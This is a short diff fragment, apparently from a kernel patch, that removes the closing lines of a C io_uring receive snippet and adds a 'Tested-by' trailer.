-    io_uring_prep_recv(sqe, fds[1], NULL, 0, 0);
-    sqe->flags |=  1<<IOSQE_BUFFER_SELECT_BIT;
-    io_uring_submit(&ring);
-    struct io_uring_cqe* cqe;
-    io_uring_wait_cqe(&ring, &cqe);
-}
+Tested-by: Wei Fang <wei.fang@nxp.com>
 
 
